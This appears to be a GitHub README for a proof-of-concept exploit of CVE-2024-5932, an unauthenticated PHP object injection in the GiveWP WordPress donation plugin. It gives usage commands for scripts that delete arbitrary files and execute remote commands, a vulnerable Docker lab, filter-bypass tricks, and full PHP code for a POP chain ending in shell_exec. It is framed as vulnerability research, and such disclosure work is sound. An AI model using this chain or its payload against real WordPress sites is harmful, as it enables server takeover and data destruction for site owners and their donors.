This post is a research article published by [EQSTLab](https://github.com/EQSTLab).


## ❗❗ IMPORTANT ❗❗ 
**There are currently fake PoC github repositories running xmrig. Check out the link below for more information**:

URL1: https://x.com/win3zz/status/1828704644987511107

URL2: https://x.com/bornunique911/status/1828712791844524453

URL3: https://x.com/Chocapikk_/status/1828801346637856841



# CVE-2024-5932
★ CVE-2024-5932 Arbitrary File deletion and RCE PoC ★




https://github.com/user-attachments/assets/333e347a-fd71-404a-962b-2d0d4bb952c7



## Timeline
**Aug 25** : CVE-2024-5932 File Deletion PoC Uploaded

**Aug 26** : We have successfully executed arbitrary commands using CVE-2024-5932, but are considering disclosure due to the impact.


**Aug 27** : We found a detailed analysis of the PoC in a [post](https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932/) by Julien Ahrens of RCE Security and decided to publish our RCE PoC. We uploaded an additional RCE PoC as **CVE-2024-5932-rce.py**.


## Description
CVE-2024-5932 : GiveWP PHP Object Injection vulnerability
description: The GiveWP  Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to PHP Object Injection in all versions up to, and including, 3.14.1 via deserialization of untrusted input from the 'give_title' parameter. This makes it possible for unauthenticated attackers to inject a PHP Object. The additional presence of a POP chain allows attackers to execute code remotely, and to delete arbitrary files.

## How to use

### Git clone
```
git clone https://github.com/EQSTLab/CVE-2024-5932.git
cd CVE-2024-5932
```
### Install packages 
```sh
pip install -r requirements.txt
```
### Command
```sh
# Arbitrary file deletion
python CVE-2024-5932.py -u <URL_TO_EXPLOIT(Donation Form URL)> -f <FILE_TO_DELETE>
# Remote code execution
python CVE-2024-5932-rce.py -u <URL_TO_EXPLOIT(Donation Form URL)> -c <COMMAND_TO_EXECUTE>
```

### Example 
```sh
python CVE-2024-5932.py -u http://example.com/2024/08/24/donation2/ -f /tmp/test
python CVE-2024-5932-rce.py -u http://example.com/2024/08/24/donation2/ -c "touch /tmp/test"
```

### Output
**CVE-2024-5932.py**
![0](https://github.com/user-attachments/assets/4ce2bce6-4a24-4d73-9c7e-becd12f2dbe0)


**CVE-2024-5932-rce.py**
![1](https://github.com/user-attachments/assets/d68f4ebf-a1e0-4389-b9e4-e1d23c6fa235)



### Result
![image](https://github.com/user-attachments/assets/613f6f4f-8de3-4200-8f29-b46719083bff)
![2](https://github.com/user-attachments/assets/3bf5402d-baf2-4bc0-8452-8f249a55ebe3)

## Vulnerable Environment
### 1. docker-compose.yml
```sh
services:
  db:
    image: mysql:8.0.27
    command: '--default-authentication-plugin=mysql_native_password'
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=somewordpress
      - MYSQL_DATABASE=wordpress
      - MYSQL_USER=wordpress
      - MYSQL_PASSWORD=wordpress
    expose:
      - 3306
      - 33060
  wordpress:
    image: wordpress:6.3.2
    ports:
      - 80:80
    restart: always
    environment:
      - WORDPRESS_DB_HOST=db
      - WORDPRESS_DB_USER=wordpress
      - WORDPRESS_DB_PASSWORD=wordpress
      - WORDPRESS_DB_NAME=wordpress
volumes:
  db_data:
```

### 2. Then download vulnerable GiveWP plugin:
https://downloads.wordpress.org/plugin/give.3.14.1.zip

### 3. Unzip the GiveWP plugin zip file and copy the entire file to the “/var/www/html/wp-content/plugins” directory.
```sh
docker cp give docker-wordpress-1:/var/www/html/wp-content/plugins
```

### 4. Activate the GiveWP plugin
![image](https://github.com/user-attachments/assets/11c37afa-17dc-48bf-8819-d0bf24daaab8)

### 5. Add new post with GiveWP plugin and copy the post link
![image](https://github.com/user-attachments/assets/6b806d89-dfa6-44be-809c-03ba3f666605)

### 6. Check the vulnerable link
![image](https://github.com/user-attachments/assets/23247a02-d8a0-4bcc-8c3b-0d424dba260d)


### (Option) Setup the target file in the docker environment 
First, access the wordpress shell with the following command:
```sh
docker exec -it -u root docker-wordpress-1 /bin/bash
```

If the file is owned by root, it may not be deleted due to permissions. Therefore, you need to change the ownership of the test file with the following command:
```sh
touch test && chown www-data test
```
![image](https://github.com/user-attachments/assets/eb46528d-975a-46d3-b917-0a144252798f)


## Debugging thru PHPSTORM
You can debug your GiveWP using PHPSTORM.

### 1. Download the xdebug in your wordpress(Docker):
```sh
pecl install xdebug
```

### 2. And then setup wordpress's php.ini file like(Docker):
```sh
[DEBUG]
zend_extension=/usr/local/lib/php/extensions/no-debug-non-zts-20200930/xdebug.so
xdebug.mode=debug
xdebug.start_with_request=trigger
xdebug.remote_enable=on
xdebug.remote_handler=dbgp
xdebug.client_host={your_PHPSTORM_address}
xdebug.client_port={your_PHPSTORM_debugging_port}
xdebug.idekey=PHPSTORM
xdebug.profiler_enable_trigger=1
xdebug.trace_enable_trigger=1
```
..And then you can debug your wordpress.

### 3. Setup PHPSTORM like(Local):
![image](https://github.com/user-attachments/assets/d236eeba-b482-43e3-9028-3651cdbd10fd)
![image](https://github.com/user-attachments/assets/021c0cea-fbec-46e5-8824-bf6fd1feaed4)

### 4. PHPSTORM example (e.g. TCPDF arbitrary file deletion)
![image](https://github.com/user-attachments/assets/433c4824-314e-4982-bf85-34640a259053)


# Analysis
## Vulnerable point (includes/payments/class-give-payment.php)
At this point, get_meta() function unserializes the previously saved "give_title" value.
```sh
switch ( $key ) {
						case 'title':
							$user_info[ $key ] = Give()->donor_meta->get_meta( $donor->id, '_give_donor_title_prefix', true );
							break;
...
```

## Bypass technique
strip_tags: replace nullbytes -> using \0

stripslashes_deep: replace backslashes -> using \\\\\\\\

##  POP chaining for RCE
Stripe\StripeObject->__toString()

Stripe\StripeObject->toArray()

Give\PaymentGateways\DataTransferObjects\GiveInsertPaymentData->toArray()

Give\PaymentGateways\DataTransferObjects\GiveInsertPaymentData->getLegacyBillingAddress()

Give->__get('address1')

\Give\Vendors\Faker\ValidGenerator->get('address1')

\Give\Vendors\Faker\ValidGenerator->__call('get', 'address1')

Give\Onboarding\SettingsRepository->get('address1')  (Return command string)

call_user_func('shell_exec', 'command')



PoC.php
```sh
<?php
namespace Stripe{
	class StripeObject
	{
		protected $_values;
		public function __construct(){
			$this->_values['foo'] = new \Give\PaymentGateways\DataTransferObjects\GiveInsertPaymentData();
		}
	}
}

namespace Give\PaymentGateways\DataTransferObjects{
	class GiveInsertPaymentData{
    public $userInfo;
		public function __construct()
    {
        $this->userInfo['address'] = new \Give();
    } 
	}
}	

namespace{
	class Give{
		protected $container;
		public function __construct()
		{
			$this->container = new \Give\Vendors\Faker\ValidGenerator();
		}
	}
}

namespace Give\Vendors\Faker{
	class ValidGenerator{
		protected $validator;
		protected $generator;
		public function __construct()
		{
			$this->validator = "shell_exec";
			$this->generator = new \Give\Onboarding\SettingsRepository();
		}
	}
}

namespace Give\Onboarding{
	class SettingsRepository{
		protected $settings;
		public function __construct()
		{
			$this -> settings['address1'] = 'touch /tmp/EQSTtest';
		}
	}
}

namespace{
	$a = new Stripe\StripeObject();
	echo serialize($a);
}
```


# Attack Scenario
## RCE thru POP Chain
POP Chain allows remote command execution.
![image](https://github.com/user-attachments/assets/bb6773cc-34e3-4f05-9758-f3fe649bd6de)

## Arbitrary File deletion 
Using TCPDF, you can exploit the arbitrary file deletion.

# Disclaimer
This repository is not intended to be Object injection exploit to CVE-2024-5932. The purpose of this project is to help people learn about this vulnerability, and perhaps test their own applications.

# EQST Insight
We publish CVE and malware analysis once a month. If you're interested, please follow the links below to check out our publications.
https://www.skshieldus.com/eng/business/insight.do

# Reference
https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin/

